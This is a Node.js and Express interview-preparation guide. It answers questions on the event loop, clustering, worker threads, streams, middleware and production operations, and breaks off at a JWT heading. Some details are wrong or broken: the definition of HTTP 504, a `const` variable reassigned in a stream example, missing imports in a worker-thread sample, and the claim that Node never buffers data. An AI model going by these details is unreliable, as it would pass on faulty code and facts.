### **1. What is a first class function in Javascript?**

When functions can be treated like any other variable then those functions are first-class functions. There are many other programming languages, for example, scala, Haskell, etc which follow this including JS. Now because of this function can be passed as a param to another function(callback) or a function can return another function(higher-order function). map() and filter() are higher-order functions that are popularly used.

**2. How many types of API functions are there in Node.js?**

There are two types of API functions:

- **Asynchronous, non-blocking functions** - mostly I/O operations which can be fork out of the main loop.
- **Synchronous, blocking functions** - mostly operations that influence the process running in the main loop.

1. **How do you create a simple server in Node.js that returns Hello World?**

```jsx
var http = require("http");
http.createServer(function (request, response) {
  response.writeHead(200, {'Content-Type': 'text/plain'});
  response.end('Hello World\n');
}).listen(3000);
```

1. **What is fork in node JS?**

A fork in general is used to spawn child processes. In node it is used to create a new instance of v8 engine to run multiple workers to execute the code.

1. **What are some commonly used timing features of Node.js?**
- **setTimeout/clearTimeout** – This is used to implement delays in code execution.
- **setInterval/clearInterval** – This is used to run a code block multiple times.
- **setImmediate/clearImmediate** – Any function passed as the setImmediate() argument is a callback that's executed in the next iteration ****of the event loop.
- **process.nextTick** – Both setImmediate and process.nextTick appear to be doing the same thing; however, you may prefer one over the other depending on your callback’s urgency.

1. **Explain the steps how “Control Flow” controls the functions calls?**
- Control the order of execution
- Collect data
- Limit concurrency
- Call the following step in the program.

1. **What is an Event Emitter in Node.js?**

EventEmitter is a Node.js class that includes all the objects that are basically capable of emitting events. This can be done by attaching named events that are emitted by the object using an eventEmitter.on() function. Thus whenever this object throws an even the attached functions are invoked synchronously.

```
const EventEmitter = require('events');
class MyEmitter extends EventEmitter{}
const myEmitter = new MyEmitter();
myEmitter.on('event', () => {
 console.log('an event occurred!');
});
myEmitter.emit('event');
```

1. **Enhancing Node.js performance through clustering.**
    
    Node.js applications run on a single processor, which means that by default they don’t take advantage of a multiple-core system. Cluster mode is used to start up multiple node.js processes thereby having multiple instances of the event loop. When we start using cluster in a nodejs app behind the scene multiple node.js processes are created but there is also a parent process called the **cluster manager** which is responsible for monitoring the health of the individual instances of our application.
    

```jsx
const cluster = require('cluster');
const http = require('http');
const os = require('os');

if (cluster.isMaster) {
  const numCPUs = os.cpus().length;
  for (let i = 0; i < numCPUs; i++) {
	cluster.fork(); // Create a worker process
  }
} else {
  http.createServer((req, res) => {
	res.writeHead(200);
	res.end('Hello, World!');
  }).listen(3000);
}
```

In this setup:

- The **master process** forks a worker process for each CPU core
- Each worker handles incoming requests, distributing the load and improving performance

Clustering is ideal for CPU-intensive tasks and high-traffic applications.

1. **How are worker threads different from clusters?**

**Cluster:**

- There is one process on each CPU with an IPC to communicate.
- In case we want to have multiple servers accepting HTTP requests via a single port, clusters can be helpful.
- The processes are spawned in each CPU thus will have separate memory and node instance which further will lead to memory issues.

**Worker threads:**

- There is only one process in total with multiple threads.
- Each thread has one Node instance (one event loop, one JS engine) with most of the APIs accessible.
- Shares memory with other threads (e.g. SharedArrayBuffer)
- This can be used for CPU-intensive tasks like processing data or accessing the file system since NodeJS is single-threaded, synchronous tasks can be made more efficient leveraging the worker's threads.

1. **How do you approach API versioning (URI vs header vs content negotiation)?**

API versioning is used to evolve APIs without breaking existing clients. Common approaches differ in how the version is specified.

- URI versioning includes the version in the URL (for example, **/v1/users**). It is simple, explicit, and easy to debug, which makes it the most commonly used approach in practice.
- **Header-based versioning** sends the version in a request header. It keeps URLs clean but requires clients and infrastructure to handle custom headers correctly.
- Content negotiation uses the **Accept** header with versioned media types. It is flexible but adds complexity and is harder to reason about during debugging.

In production systems, URI-based versioning is often preferred for clarity, while header-based or content negotiation approaches are used when stricter API contracts are required.

1. **How do you prevent blocking the event loop when doing heavy work in an Express route?**

Express runs on Node.js, which uses a single-threaded event loop. Any CPU-intensive or long-running synchronous work inside a route can block the event loop and degrade performance for all requests.

**To prevent this:**

- Offload CPU-heavy tasks to worker threads or separate processes
- Use asynchronous, non-blocking APIs for I/O operations
- Move background work to queues or job workers
- Avoid synchronous loops, heavy JSON processing, or crypto operations inside routes

In production systems, Express routes should remain lightweight and delegate heavy work elsewhere to maintain responsiveness.

1. **How do you implement streaming responses (downloads or large payloads) in Express?**

Streaming responses allow data to be sent incrementally instead of loading the entire payload into memory.

In Express, this is typically done using **Node.js streams**, such as readable streams piped directly to the response.

Common use cases include:

- File downloads
- Large exports (CSV, logs)
- Proxying data from another service

Streaming improves memory efficiency and enables backpressure handling. It is preferred over buffering large payloads in memory, especially for high-traffic or data-heavy endpoints.

1. **How do you implement idempotency for POST endpoints (payment or order APIs)?**

Idempotency ensures that repeated requests produce the same result, which is critical for APIs handling payments, orders, or retries.

A common approach is:

- Require clients to send an idempotency key with the request
- Store the key along with the request result in persistent storage
- If the same key is received again, return the previous response instead of reprocessing

Idempotency logic is usually implemented as middleware or service-level logic, before executing the main operation. This prevents duplicate charges or duplicate resource creation during retries or network failures.

1. **How do you design pagination (offset vs cursor) and handle consistency?**

Pagination is used to return large datasets in manageable chunks.

- **Offset-based pagination** uses page numbers or offsets and is simple to implement, but it can become slow and inconsistent when data changes frequently.
- **Cursor-based pagination** uses a stable reference (such as an ID or timestamp) and provides better performance and consistency for large or frequently updated datasets.

In production systems:

- Offset pagination is suitable for small or static datasets
- Cursor pagination is preferred for APIs with large tables or real-time data

Handling consistency involves defining clear sort order and ensuring cursors are stable and deterministic.

1. **How do you implement graceful shutdown for an Express server?**

Graceful shutdown ensures that an Express server stops accepting new requests while allowing in-flight requests to complete.

A typical approach includes:

- Listening for shutdown signals such as **SIGTERM** or **SIGINT**
- Stopping the server from accepting new connections
- Allowing active requests to finish within a timeout
- Closing database connections and other resources cleanly

This prevents dropped requests during deployments or restarts and is essential for zero-downtime production systems.

1. **How do you handle centralized logging and correlation IDs across microservices?**

Centralized logging collects logs from multiple services into a single searchable system, making debugging and tracing easier.

Correlation IDs are used to track a single request across services by:

- Generating or propagating a request ID at the edge
- Attaching the ID to logs, headers, and downstream calls

In Express, correlation IDs are typically handled via middleware and included in all log entries. This approach helps trace failures, measure latency across services, and debug distributed systems effectively.

1. **What is middleware in Express, and what does next() do?**

Middleware in Express is a function that executes between receiving a request and sending a response. It can read or modify the request and response objects or end the request cycle.

**Common uses of middleware include:**

- Authentication and authorization
- Logging
- Request parsing
- Validation and error handling

The **next()** function passes control to the next middleware or route handler in the chain. If **next()** is not called and no response is sent, the request will hang.

Middleware order matters in Express, as it determines how requests flow through the application.

1. **What’s the difference between app.use() and route handlers like app.get()?**

**app.use()** is used to register middleware that runs for every request or for a specific path prefix. It is not tied to a particular HTTP method.

Route handlers like **app.get(), app.post()**, etc., are method-specific and only run when both the path and HTTP method match.

1. **How do you serve static files in Express, and what are common pitfalls?**

Static files in Express are served using the built-in **express.static** middleware.

Example: **app.use(express.static('public'));**

This allows files inside the public directory (HTML, CSS, images, JS) to be served directly.

**Common pitfalls include:**

- Placing **express.static** after route handlers, causing requests to never reach it
- Exposing sensitive files by serving the wrong directory
- Incorrect path resolution when using relative paths
- Forgetting to configure caching headers for production

Serving static files is simple, but incorrect placement or configuration can lead to security and performance issues.

1. **What is express.Router() and why do we use it?**

**express.Router()** is a modular routing mechanism that allows routes and middleware to be grouped and managed separately from the main application.

It is used to:

- Organize routes by feature or domain
- Keep the main **app.js** or server.js file clean
- Apply middleware to specific route groups

**Example usage:**

const router = express.Router();

router.get('/users', getUsers);

router.post('/users', createUser);

app.use('/api', router);

Using routers improves maintainability and scalability, especially in larger Express applications with multiple features or teams working on the same codebase.

1. **How do you handle JSON request bodies safely in Express, and what middleware is typically used?**

JSON request bodies in Express are handled using built-in body parsing middleware.

The commonly used middleware is:

app.use(express.json());

This middleware parses incoming JSON payloads and makes the data available on req.body.

To handle JSON bodies safely, it is important to:

- Set reasonable **size limits** to prevent large payload abuse
- Validate and sanitize input before using it
- Handle parsing errors gracefully

In production applications, JSON parsing is usually combined with request validation and security middleware.

1. **How do you decide between cluster and worker_threads for scaling a Node service?**

The choice depends on what kind of work needs to be scaled.

- **cluster** is used to scale a Node.js service across multiple CPU cores by running multiple processes. Each process has its own event loop and memory space, making it suitable for handling more concurrent requests.
- **worker_threads** are used to offload CPU-intensive tasks within the same process. They share memory and are useful for heavy computation that would otherwise block the event loop.

In practice:

- Use cluster for request-level concurrency and horizontal scaling
- Use worker threads for CPU-bound work that cannot be made asynchronous

1. **What are common causes of event loop blocking, and how do you detect them?**

Event loop blocking happens when synchronous or long-running tasks prevent Node.js from handling other requests.

**Common causes include:**

- CPU-intensive computations
- Large synchronous loops
- Heavy JSON serialization or parsing
- Expensive regex operations
- Blocking file system or crypto calls

**Detection usually involves:**

- Monitoring event loop delay
- Observing increased request latency under load
- Profiling the application to identify long-running synchronous functions

This question tests whether the candidate understands how Node’s runtime behavior directly impacts application performance.

1. **How do you diagnose memory leaks in Node.js in production?**

Diagnosing memory leaks in production focuses on identifying objects that keep growing and are not released.

**Common approaches include:**

- Monitoring heap usage over time to see if memory keeps increasing without stabilizing
- Comparing heap snapshots taken at different intervals to find retained objects
- Checking for unbounded caches, global references, event listeners, or closures
- Observing garbage collection behavior, frequent or long GC cycles often indicate pressure
- Correlating memory growth with specific traffic patterns or features

The goal is to distinguish between expected memory usage (such as caches) and unintended object retention.

1. **What metrics do you monitor for Node services beyond CPU and RAM?**

Beyond CPU and memory, production Node services require runtime and application-level metrics.

**Commonly monitored metrics include:**

- Event loop delay to detect blocking
- Request latency (p50, p95, p99)
- Throughput and error rates
- Garbage collection frequency and duration
- Thread pool usage for async operations
- Database and external dependency latency
- Queue depth or backlog for background jobs

These metrics help detect performance degradation early and pinpoint whether issues are caused by the runtime, application logic, or dependencies.

1. **Explain backpressure in streams. What breaks if you ignore it?**

Backpressure is the mechanism that allows a system to slow down data producers when consumers can’t keep up. In Node.js streams, it prevents memory from growing uncontrollably.

If backpressure is ignored:

- Buffers keep filling up, increasing memory usage
- The process may experience GC pressure or crashes
- Latency increases as data queues up
- Downstream systems can be overwhelmed

Properly handling backpressure using stream piping and respecting **write()** return values ensures data flows at a rate the system can safely process.

1. **How do you implement graceful shutdown in Node (SIGTERM) without dropping requests?**

Graceful shutdown allows a Node service to stop cleanly during deploys or restarts.

A typical approach includes:

- Listening for **SIGTERM** or **SIGINT** signals
- Stopping the server from accepting new connections
- Allowing in-flight requests to complete within a timeout
- Closing database connections, queues, and other resources

This prevents request loss and ensures the service exits predictably, which is essential for reliable production deployments

1. **What’s your approach to zero-downtime deployments?**

Zero-downtime deployments aim to update services without interrupting active traffic.

A typical approach includes:

- Draining existing connections before shutting down instances
- Respecting keep-alive connections and setting reasonable timeouts
- Using load balancers to stop routing new traffic to instances being terminated
- Performing graceful shutdown so in-flight requests complete

This ensures deployments do not cause failed requests or user-visible outages.

1. **How do you design retries and timeouts to avoid retry storms?**

Retries and timeouts must be designed carefully to avoid amplifying failures.

Best practices include:

- Setting strict timeouts for external calls
- Limiting retry attempts and adding exponential backoff
- Using jitter to avoid synchronized retries
- Avoiding retries for non-idempotent operations
- Combining retries with circuit breakers

This approach prevents cascading failures when a dependency becomes slow or unavailable.

1. **What’s the difference between process-level concurrency and thread-level concurrency in Node?**

Process-level concurrency runs multiple Node.js processes (for example, using **cluster**).

- Each process has its own event loop and memory
- Scales well across CPU cores
- Strong isolation, but higher memory usage

Thread-level concurrency uses worker threads within a single process.

- Threads share memory and can communicate efficiently
- Best suited for CPU-intensive tasks
- Requires careful handling to avoid race conditions

In practice, process-level concurrency is used to scale request handling, while thread-level concurrency is used to offload heavy computation.

1. **How do you secure Node apps against common risks (secrets, headers, dependencies, input validation)?**

Securing Node applications requires controls at multiple layers.

**Common practices include:**

- Managing secrets via environment variables or secret managers, not code or repos
- Setting secure HTTP headers to protect against common attacks
- Keeping dependencies updated and scanning for vulnerabilities
- Validating and sanitizing all external inputs
- Limiting error details exposed to clients

Security is an ongoing process and must be enforced consistently across development, deployment, and runtime environments.

1. **How do you manage configuration safely across environments (12-factor principles)?**

Managing configuration safely means keeping config separate from code and environment-specific.

**Common practices aligned with 12-factor principles include:**

- Using environment variables for all environment-specific settings
- Avoiding hard-coded secrets or environment-specific logic
- Validating configuration at startup and failing fast on missing values
- Using secret managers for sensitive data
- Keeping configuration consistent across local, staging, and production

This approach simplifies deployments and reduces configuration-related failures.

1. **How do you structure a large Node monorepo (packages, shared libraries, boundaries)?**

A large Node monorepo is structured to balance code reuse and isolation.

**Common patterns include:**

- Organizing code into packages by domain or service
- Extracting shared logic into well-defined shared libraries
- Enforcing clear boundaries between packages to prevent tight coupling
- Using tooling to manage dependencies and versioning consistently

This structure improves scalability, maintainability, and collaboration across teams working in the same repository.

1. **How do you capture diagnostics safely without taking down the service?**

Capturing diagnostics in production must be done carefully to avoid additional outages.

**Safe practices include:**

- Using structured logs with adjustable log levels
- Capturing heap snapshots or profiles during low traffic
- Applying sampling to avoid excessive overhead
- Avoiding blocking operations during diagnostics
- Collecting data incrementally rather than all at once

This ensures observability and debugging are possible without destabilizing the running service.

1. **A route randomly returns “Cannot set headers after they are sent.” What causes this and how do you fix it?**

This error occurs when Express attempts to send more than one response for the same request.

Common causes include:

- Calling **res.send() / res.json()** and then continuing execution
- Missing **return** statements after sending a response
- Calling **next()** after a response has already been sent
- Multiple async code paths resolving and sending responses
- Error handling logic that sends a response twice

To fix it:

- Ensure each request has exactly one response path
- Add **return** after sending a response
- Avoid calling **next()** once a response is finalized
- Carefully handle async logic, so only one branch responds

Interviewers use this scenario to check whether candidates understand Express request-response lifecycle control.

1. **How do you isolate work using separate processes, queues, or worker threads?**

Isolation is used to prevent heavy or unstable workloads from impacting request handling.

**Common approaches include:**

- Running heavy tasks in separate processes or services
- Using queues to process background jobs asynchronously
- Offloading CPU-intensive work to worker threads
- Keeping Express routes lightweight and delegating work

Choosing the right isolation strategy depends on whether the workload is CPU-bound, I/O-bound, or latency-sensitive.

1. **How do you redesign an endpoint using streaming and limits?**

When an endpoint struggles under load due to large payloads or unbounded processing, redesigning it with streaming and limits improves stability.

**Typical changes include:**

- Streaming request and response data instead of buffering everything in memory
- Applying size limits on request bodies and uploads
- Using pagination or chunked responses for large datasets
- Enforcing timeouts and backpressure-aware processing

This approach reduces memory usage, prevents event loop blocking, and makes endpoints more resilient under high traffic.

1. **How do you design circuit breakers, bulkheads, and fallbacks?**

These patterns are used to protect services from cascading failures when dependencies become slow or unavailable.

A common approach includes:

- **Circuit breakers** to stop calling a failing dependency after repeated errors and allow recovery after a cooldown
- **Bulkheads** to isolate resources (threads, connections, queues) so one failing component does not exhaust the entire system
- **Fallbacks** to return cached data, defaults, or partial responses when a dependency is unavailable

In Express-based systems, these patterns are usually implemented at the service or client layer, not directly inside route handlers, to keep request handling predictable.

1. **How do you check event loop delay, thread pool starvation, or a stuck DB pool?**

These issues affect throughput even when CPU or memory looks normal.

**Typical checks include:**

- Measuring event loop delay to detect synchronous blocking
- Monitoring thread pool usage for saturation caused by crypto, file I/O, or DNS
- Inspecting database pool metrics for exhausted or unreleased connections
- Checking request latency patterns under load
- Correlating slow requests with blocking operations or resource exhaustion

This scenario tests whether a candidate can reason about Node.js runtime internals rather than focusing only on application code.

1. **How do you confirm a memory leak vs cache growth vs GC pressure?**

When memory usage keeps increasing, the key is to determine why memory is not being released.

**Common ways to differentiate include:**

- Checking whether memory grows steadily (leak) or stabilizes after warming up (cache growth)
- Reviewing cache size limits, eviction policies, and TTLs
- Observing **GC behavior**, frequent or long garbage collection pauses indicate GC pressure
- Taking heap snapshots over time and comparing retained objects
- Looking for unbounded data structures, global references, or event listeners

This helps distinguish between intentional memory usage (caches) and unintentional retention (leaks).

1. **How do you identify infinite loops, regex backtracking, JSON stringify hotspots, or tight polling?**

These issues cause CPU spikes and event loop blocking, often only visible under load.

**Common ways to identify them include:**

- Monitoring event loop delay and CPU usage during incidents
- Reviewing code paths with synchronous loops or heavy computations
- Profiling the application to find slow functions or repeated executions
- Watching for excessive timers, polling intervals, or unbounded retries
- Inspecting regex usage for patterns prone to catastrophic backtracking

Once identified, fixes typically involve rewriting logic to be asynchronous, limiting execution frequency, or moving heavy work off the request path.

1. **Users report inconsistent results due to caching. How do you set correct cache headers and invalidation?**

Inconsistent results usually mean cache scope or invalidation is incorrect.

Key checks and fixes include:

- Setting explicit cache headers **(Cache-Control, ETag, Last-Modified)** based on data freshness requirements
- Avoiding caching for user-specific or frequently changing responses
- Using **ETags** or conditional requests to revalidate cached content
- Ensuring cache keys include all relevant request dimensions (auth, query params, locale)
- Implementing clear invalidation on writes (purge, versioned keys, or TTLs)

The goal is to cache only safe, deterministic responses and invalidate them predictably when data changes.

1. **An endpoint is slow under load. How do you separate DB latency vs CPU blocking vs network issues?**

To isolate performance bottlenecks, the first step is to measure where time is being spent.

**Common checks include:**

- Reviewing database query timings and connection pool metrics
- Checking for event loop blocking or long synchronous operations
- Inspecting outbound calls and network latency to dependencies
- Comparing response times with and without database access
- Reviewing logs and traces under load

This process helps distinguish whether slowness is caused by database pressure, CPU-bound work, or network dependencies, rather than guessing.

1. **Your API is getting abused. What’s your layered approach?**

When an API is being abused, protection should be applied in multiple layers, not just at the application level.

**A typical layered approach includes:**

- Rate limiting at the edge or middleware level to cap request volume
- Authentication and authorization to restrict access to known users
- WAF rules to block common attack patterns
- Caching for safe, repeatable requests to reduce backend load
- Request validation to reject malformed or abusive inputs early

This approach ensures abuse is controlled even if one protection layer fails.

1. **You added an auth middleware, but some routes are bypassing it. How do you diagnose middleware order?**

When authentication middleware is bypassed, the issue is almost always related to middleware ordering or mounting scope.

Key things to check:

- Whether the auth middleware is registered before the affected routes
- Whether it is attached using **app.use()** or only to specific routers
- If routes are mounted before the middleware is applied
- Whether **next()** is being called unconditionally inside the auth middleware
- If some routes are mounted on a different router or path prefix

In Express, middleware executes in the order it is defined, so incorrect placement can cause routes to skip critical checks.

This scenario tests whether the candidate understands Express execution flow and middleware sequencing, which is a core production concept.

1. **How do you handle errors in Node.js?**

Error handling is essential in Node.js, especially since many operations are asynchronous. There are several common patterns:

**Using Callbacks**

Many asynchronous methods accept a callback with an `err` parameter.

```jsx
fs.readFile('file.txt', 'utf8', (err, data) => {
  if (err) {
	console.error('Error reading file:', err.message);
	return;
  }
  console.log(data);
});
```

**Using Promises**

Promises handle errors with `.catch()`.

```jsx
fs.promises.readFile('file.txt', 'utf8')
  .then((data) => console.log(data))
  .catch((err) => console.error('Error:', err.message));
```

**Using `try...catch` with Async/Await**

Async/await provides a clean way to handle errors.

```jsx
async function readFile() {
  try {
	const data = await fs.promises.readFile('file.txt', 'utf8');
	console.log(data);
  } catch (err) {
	console.error('Error:', err.message);
  }
}
readFile();
```

Each method is suited to different scenarios, but async/await is preferred in modern applications for its readability.

1. **What are worker threads in Node.js, and when should you use them?**

Worker threads allow you to run JavaScript code in parallel threads, which is useful for CPU-intensive tasks. Unlike child processes, worker threads share memory with the main thread, making them more efficient for tasks requiring shared state.

Example using worker threads:

```jsx
const { Worker } = require('worker_threads');

if (isMainThread) {
  const worker = new Worker('./worker.js');
  worker.on('message', (msg) => console.log(`Message from worker: ${msg}`));
} else {
  parentPort.postMessage('Hello from the worker thread!');
}
```

We use worker threads for computationally expensive tasks, like algorithms or data processing, where shared memory access is beneficial.

1. **What is event loop starvation, and how can it be prevented?**

Event loop starvation occurs when long-running tasks block the event loop, preventing it from handling other tasks. This can make your application unresponsive.

Example of a blocking task:

`while (true) {
  // This loop blocks the event loop
}`

How to prevent event loop starvation:

- **Use worker threads**: Offload CPU-intensive tasks to separate threads
- **Asynchronous operations**: Avoid blocking the event loop with synchronous methods
- **Split tasks into smaller chunks**: Process large tasks incrementally to allow the event loop to handle other operations in between

By designing your application with non-blocking principles, you can keep the event loop responsive and ensure scalability.

1. **How do you debug memory leaks in Node.js?**

Memory leaks occur when memory that is no longer needed is not released.

Common causes include unreferenced variables, event listeners not being removed, or large objects being unintentionally kept in scope.

Steps to debug memory leaks:

1. **Monitor memory usage**: Use `process.memoryUsage()` to track memory over time
2. **Capture heap snapshots**: Use Chrome DevTools or the `v8` module to analyze memory usage
3. **Use diagnostic tools**: Tools like `clinic.js`, `memwatch`, or `node-inspect` help identify memory leaks
4. **Remove unused listeners**: Ensure event listeners are properly removed using `removeListener` or `off`

By proactively profiling and monitoring your application, you can identify and fix memory leaks before they impact performance.

1. **What can we build with Node.js?**

[Node.js developers](https://www.turing.com/jobs/remote-node-js-developer) can build various applications, including web applications, chat applications, real-time applications, streaming applications, APIs, and desktop applications, etc.

1. **What are security implementations within Node.js?**

The different types of security implementations within Node.js include error handling, authentications and authorization, data sanitization, encryption, and logging and monitoring.

1. **What causes server latency and prevents scalability in Node.js?**

Several factors can cause server latency and prevent scalability in Node.js. Some of the most common ones include:

- **Blocking I/O**: Blocking I/O operations can cause the server to become unresponsive while waiting for I/O operations to complete. This can be especially problematic in Node.js, which is designed to handle many concurrent connections. To avoid this, Node.js provides non-blocking I/O operations.
- **Inefficient code**: Inefficient code can cause unnecessary processing and slow down the server. This can be caused by poor algorithmic choices, excessive use of synchronous operations, or inefficient data structures.
- **Insufficient hardware resources**: Insufficient hardware resources, such as CPU, memory, or network bandwidth, can cause the server to become overloaded and unresponsive. This can be especially problematic in high traffic scenarios.
- **Improper configuration**: Improperly configured servers can cause performance issues. This can be caused by incorrect network settings, improper load balancing, or other misconfigurations.

1. **How is Ajax different from Node.js?**

Ajax is a client-side technology used to make web pages more interactive and dynamic, while Node.js is a server-side technology used to build scalable, high-performance web applications.

1. **Define control function in Node.js.**

A control function manages and manipulates the flow of asynchronous code execution.

Node.js is designed to handle asynchronous I/O operations, which means that multiple I/O operations can be executed simultaneously without blocking the execution of other code. However, managing the flow of asynchronous code can be challenging, especially when multiple operations need to be executed in a particular order.

Control functions provide a solution to this problem by allowing developers to define the order in which asynchronous operations should be executed. They can be used to perform tasks such as error handling, callback management, and flow control.

1. **Name input arguments for asynchronous queue.**

Two input arguments for asynchronous queue are concurrency value and task function.

1. **Is it possible to run external processes with Node.js?**

It is possible to run external processes with Node.js. This can be done with the help of the child_process module.

```jsx
const { exec } = require('child_process');

exec('"/path/to/test file/test.sh" arg1 arg2');

exec('echo "The \\$HOME variable is $HOME"');
```

1. **What is the meaning of HTTP status code 504?**

HTTP status code 504 indicates that the server is unable to process the request. This can be due to several reasons, such as an overloaded server or a network issue.

1. **What are the key features of Node.js?**
- **Asynchronous and Event driven** – All APIs of Node.js are asynchronous. This feature means that if a Node receives a request for some Input/Output operation, it will execute that operation in the background and continue with the processing of other requests. Thus it will not wait for the response from the previous requests.
- **Fast in Code execution** – Node.js uses the V8 JavaScript Runtime engine, the one which is used by Google Chrome. Node has a wrapper over the JavaScript engine which makes the runtime engine much faster and hence processing of requests within Node.js also become faster.
- **Single Threaded but Highly Scalable** – Node.js uses a single thread model for event looping. The response from these events may or may not reach the server immediately. However, this does not block other operations. Thus making Node.js highly scalable. Traditional servers create limited threads to handle requests while Node.js creates a single thread that provides service to much larger numbers of such requests.
- **Node.js library uses JavaScript** – This is another important aspect of Node.js from the developer's point of view. The majority of developers are already well-versed in JavaScript. Hence, development in Node.js becomes easier for a developer who knows JavaScript.
- **There is an Active and vibrant community for the Node.js framework** – The active community always keeps the framework updated with the latest trends in the web development.
- **No Buffering** – Node.js applications never buffer any data. They simply output the data in chunks.

1. **What is chrome v8 engine?**

V8 is a C++ based open-source JavaScript engine developed by Google. It was originally designed for Google Chrome and Chromium-based browsers ( such as Brave ) in 2008, but it was later utilized to create Node.js for server-side coding.

V8 is the JavaScript engine i.e. it parses and executes JavaScript code. The DOM, and the other Web Platform APIs ( they all makeup runtime environment ) are provided by the browser.

V8 is known to be a JavaScript engine because it takes JavaScript code and executes it while browsing in Chrome. It provides a runtime environment for the execution of JavaScript code. The best part is that the JavaScript engine is completely independent of the browser in which it runs.

1. **How V8 compiles JavaScript code?**

Compilation is the process of converting human-readable code to machine code. There are two ways to compile the code

- **Using an Interpreter**: The interpreter scans the code line by line and converts it into byte code.
- **Using a Compiler**: The Compiler scans the entire document and compiles it into highly optimized byte code.

The V8 engine uses both a compiler and an interpreter and follows **just-in-time (JIT)** compilation to speed up the execution. JIT compiling works by compiling small portions of code that are just about to be executed. This prevents long compilation time and the code being compiles is only that which is highly likely to run.

1. **How the Event Loop Works in Node.js?**

The **event loop** allows Node.js to perform non-blocking I/O operations despite the fact that JavaScript is single-threaded. It is done by offloading operations to the system kernel whenever possible.

Node.js is a single-threaded application, but it can support **concurrency** via the concept of **event** and **callbacks**. Every API of Node.js is asynchronous and being single-threaded, they use **async function calls** to maintain concurrency. Node uses observer pattern. Node thread keeps an event loop and whenever a task gets completed, it fires the corresponding event which signals the event-listener function to execute.

**Features of Event Loop:**

- Event loop is an endless loop, which waits for tasks, executes them and then sleeps until it receives more tasks.
- The event loop executes tasks from the event queue only when the call stack is empty i.e. there is no ongoing task.
- The event loop allows us to use callbacks and promises.
- The event loop executes the tasks starting from the oldest first.

![Event Loop](https://github.com/Mohamed-Hashem/nodejs-interview-questions/raw/master/assets/nodejs-event-loop.png)

**Example:**

```jsx
/**
 * Event loop in Node.js
 */
const events = require('events');
const eventEmitter = new events.EventEmitter();

// Create an event handler as follows
const connectHandler = function connected() {
   console.log('connection succesful.');
   eventEmitter.emit('data_received');
}

// Bind the connection event with the handler
eventEmitter.on('connection', connectHandler);
 
// Bind the data_received event with the anonymous function
eventEmitter.on('data_received', function() {
   console.log('data received succesfully.');
});

// Fire the connection event 
eventEmitter.emit('connection');
console.log("Program Ended.");

// Output
Connection succesful.
Data received succesfully.
Program Ended.
```

1. **What is the difference between process.nextTick() and setImmediate()?**

**1. process.nextTick():**

The process.nextTick() method adds the callback function to the start of the next event queue. It is to be noted that, at the start of the program process.nextTick() method is called for the first time before the event loop is processed.

**2. setImmdeiate():**

The setImmediate() method is used to execute a function right after the current event loop finishes. It is callback function is placed in the check phase of the next event queue.

**Example:**

```
/**
 * setImmediate() and process.nextTick()
 */
setImmediate(() => {
  console.log("1st Immediate");
});

setImmediate(() => {
  console.log("2nd Immediate");
});

process.nextTick(() => {
  console.log("1st Process");
});

process.nextTick(() => {
  console.log("2nd Process");
});

// First event queue ends here
console.log("Program Started");

// Output
Program Started
1st Process
2nd Process
1st Immediate
2nd Immediate
```

1. **How to avoid callback hell in Node.js?**

**1. Managing callbacks using Async.js:**

`Async` is a really powerful npm module for managing asynchronous nature of JavaScript. Along with Node.js, it also works for JavaScript written for browsers.

Async provides lots of powerful utilities to work with asynchronous processes under different scenarios.

```
npm install --save async
```

**2. Managing callbacks hell using promises:**

Promises are alternative to callbacks while dealing with asynchronous code. Promises return the value of the result or an error exception. The core of the promises is the `.then()` function, which waits for the promise object to be returned.

The `.then()` function takes two optional functions as arguments and depending on the state of the promise only one will ever be called. The first function is called when the promise if fulfilled (A successful result). The second function is called when the promise is rejected.

**Example:**

```
/**
 * Promises
 */
const myPromise = new Promise((resolve, reject) => {
  setTimeout(() => {
    resolve("Successful!");
  }, 300);
});
```

**3. Using Async Await:**

Async await makes asynchronous code look like it's synchronous. This has only been possible because of the reintroduction of promises into node.js. Async-Await only works with functions that return a promise.

**Example:**

`/**
 * Async Await
 */
const getrandomnumber = function(){
    return new Promise((resolve, reject)=>{
        setTimeout(() => {
            resolve(Math.floor(Math.random() * 20));
        }, 1000);
    });
}

const addRandomNumber = async function(){
    const sum = await getrandomnumber() + await getrandomnumber();
    console.log(sum);
}

addRandomNumber();`

1. **How many types of streams are present in node.js?**

Streams are objects that let you read data from a source or write data to a destination in continuous fashion. There are four types of streams

- **Readable** − Stream which is used for read operation.
- **Writable** − Stream which is used for write operation.
- **Duplex** − Stream which can be used for both read and write operation.
- **Transform** − A type of duplex stream where the output is computed based on input.

Each type of Stream is an EventEmitter instance and throws several events at different instance of times.

**Example:**

- **data** − This event is fired when there is data is available to read.
- **end** − This event is fired when there is no more data to read.
- **error** − This event is fired when there is any error receiving or writing data.
- **finish** − This event is fired when all the data has been flushed to underlying system.

**Reading from a Stream:**

```
const fs = require("fs");
const data = '';

// Create a readable stream
const readerStream = fs.createReadStream('input.txt');

// Set the encoding to be utf8.
readerStream.setEncoding('UTF8');

// Handle stream events --> data, end, and error
readerStream.on('data', function(chunk) {
   data += chunk;
});

readerStream.on('end',function() {
   console.log(data);
});

readerStream.on('error', function(err) {
   console.log(err.stack);
});

console.log("Program Ended");
```

**Writing to a Stream:**

```
const fs = require("fs");
const data = 'Simply Easy Learning';

// Create a writable stream
const writerStream = fs.createWriteStream('output.txt');

// Write the data to stream with encoding to be utf8
writerStream.write(data,'UTF8');

// Mark the end of file
writerStream.end();

// Handle stream events --> finish, and error
writerStream.on('finish', function() {
   console.log("Write completed.");
});

writerStream.on('error', function(err) {
   console.log(err.stack);
});

console.log("Program Ended");
```

**Piping the Streams:**

Piping is a mechanism where we provide the output of one stream as the input to another stream. It is normally used to get data from one stream and to pass the output of that stream to another stream. There is no limit on piping operations.

```
const fs = require("fs");

// Create a readable stream
const readerStream = fs.createReadStream('input.txt');

// Create a writable stream
const writerStream = fs.createWriteStream('output.txt');

// Pipe the read and write operations
// read input.txt and write data to output.txt
readerStream.pipe(writerStream);

console.log("Program Ended");
```

**Chaining the Streams:**

Chaining is a mechanism to connect the output of one stream to another stream and create a chain of multiple stream operations. It is normally used with piping operations.

`const fs = require("fs");
const zlib = require('zlib');

// Compress the file input.txt to input.txt.gz
fs.createReadStream('input.txt')
   .pipe(zlib.createGzip())
   .pipe(fs.createWriteStream('input.txt.gz'));
  
console.log("File Compressed.");`

1. **How to use JSON Web Token (JWT) for authentication in Node.js?**

JSON Web Token (JWT) is an open standard that defines a compact and self-contained way of securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.

There are some advantages of using JWT for authorization:

- Purely stateless. No additional server or infra required to store session information.
- It can be easily shared among services.

**Syntax:**

```
